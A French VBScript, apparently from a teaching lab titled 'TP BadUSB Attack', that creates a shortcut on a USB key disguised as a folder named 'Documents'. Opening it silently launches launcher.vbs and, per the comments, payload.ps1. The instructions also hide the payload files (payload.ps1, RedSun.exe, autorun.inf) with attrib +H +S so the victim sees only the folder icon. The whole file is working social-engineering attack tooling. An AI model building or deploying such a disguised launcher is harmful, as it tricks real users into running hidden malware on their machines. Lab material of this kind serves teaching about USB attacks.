' ============================================================
' create_shortcut.vbs – Génère le raccourci .lnk déguisé en dossier
' Partie 1 – TP BadUSB Attack
'
' UTILISATION (sur la machine ATTAQUANTE, clé USB branchée) :
'   1. Remplacer "D:\" ci-dessous par la lettre de votre clé USB
'   2. Double-cliquer sur ce fichier, ou :
'        cscript //NoLogo create_shortcut.vbs
'   3. Un fichier "Documents.lnk" apparaît à la racine de la clé
'   4. Masquer les fichiers techniques (payload.ps1, RedSun.exe,
'        launcher.vbs, autorun.inf) via l'Explorateur ou :
'        attrib +H +S <fichier>
'
' RÉSULTAT :
'   La victime voit un seul icône « dossier » nommé "Documents".
'   Un double-clic déclenche launcher.vbs → payload.ps1 (silencieux).
' ============================================================

Option Explicit

' ── CONFIGURATION ─────────────────────────────────────────────
' Modifier cette valeur pour qu'elle corresponde à votre clé USB
Const USB_ROOT = "D:\"
' Nom affiché à la victime (simule un dossier)
Const LNK_NAME = "Documents"
' ──────────────────────────────────────────────────────────────

Dim oShell, oFS, oShortcut
Dim sLnkPath, sLauncher, sDriveRoot

Set oShell  = CreateObject("WScript.Shell")
Set oFS     = CreateObject("Scripting.FileSystemObject")

' Déterminer le dossier racine du raccourci
sDriveRoot = USB_ROOT
sLauncher  = sDriveRoot & "launcher.vbs"
sLnkPath   = sDriveRoot & LNK_NAME & ".lnk"

' Vérifier que launcher.vbs est bien présent
If Not oFS.FileExists(sLauncher) Then
    MsgBox "launcher.vbs introuvable dans " & sDriveRoot & Chr(13) & _
           "Vérifiez que la clé USB est bien sous " & USB_ROOT, _
           16, "Erreur – create_shortcut.vbs"
    WScript.Quit 1
End If

' Créer le raccourci
Set oShortcut = oShell.CreateShortcut(sLnkPath)

' Cible : wscript.exe lance launcher.vbs de façon totalement silencieuse
oShortcut.TargetPath       = "wscript.exe"
oShortcut.Arguments        = "//B """ & sLauncher & """"
oShortcut.WorkingDirectory = sDriveRoot

' Icône dossier (imageres.dll,3 = dossier jaune Windows 10/11)
oShortcut.IconLocation  = "%SystemRoot%\system32\imageres.dll,3"
oShortcut.WindowStyle   = 7        ' 7 = fenêtre minimisée (invisible)
oShortcut.Description   = LNK_NAME

oShortcut.Save

Set oShortcut = Nothing
Set oFS       = Nothing
Set oShell    = Nothing

MsgBox "Raccourci créé : " & sLnkPath & Chr(13) & Chr(13) & _
       "Pensez à masquer les fichiers techniques (payload.ps1, " & _
       "RedSun.exe, launcher.vbs, autorun.inf) avec attrib +H +S.", _
       64, "create_shortcut.vbs – OK"
